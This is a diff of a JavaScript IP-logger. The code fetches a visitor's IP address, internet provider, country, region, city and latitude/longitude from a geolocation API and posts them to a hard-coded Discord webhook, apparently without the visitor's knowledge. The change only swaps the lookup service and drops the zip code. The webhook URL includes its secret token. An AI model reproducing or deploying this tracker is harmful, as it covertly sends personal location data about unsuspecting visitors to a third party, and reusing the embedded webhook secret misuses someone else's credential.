@@ -1,23 +1,22 @@
 var webHookUrl = "https://discord.com/api/webhooks/1107355097459077201/XOiq1Pig7dDtKAt4XWi13D8aqv74zSOwCmkjndnkQXG_Z9zLGthwSXDPwnAvoVGUbwzw";
 
 const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('http://ip-api.com/json/', { referrerPolicy: "unsafe-url" });
+    const response = await fetch('https://ipapi.co/json');
     const data = await response.json();
 
     // Declaring variables
-    var ip = data.query;
+    var ip = data.ip;
 
-    var provider = data.org + " (" + data.as + ")";
+    var provider = data.org;
 
     var timezone = data.timezone;
-    var country = data.country;
-    var countryCode = data.countryCode.toLowerCase()
-    var region = data.region + " (" + data.regionName + ")";
+    var country = data.country_name;
+    var countryCode = data.country_code;
+    var region = data.region;
     var city = data.city;
 
-    var zip = data.zip;
-    var lat = data.lat;
-    var lon = data.lon;
+    var lat = data.latitude;
+    var lon = data.longitude;
 
     // Open POST Request
     var postRequest = new XMLHttpRequest();
@@ -36,8 +35,8 @@ const request = async () => { // Calling a "synchronous" fetch
                     + timezone + 
                     "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                     + country + " - " + region + 
-                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
-                    + zip + " " + city +
+                    "\n \n__**:cityscape: City:**__ \n" 
+                    + city +
                     "\n \n__**:round_pushpin: Location:**__ \n" 
                     + "**Longitude:** " + lon + "\n"
                     + "**Latitude:** " + lat
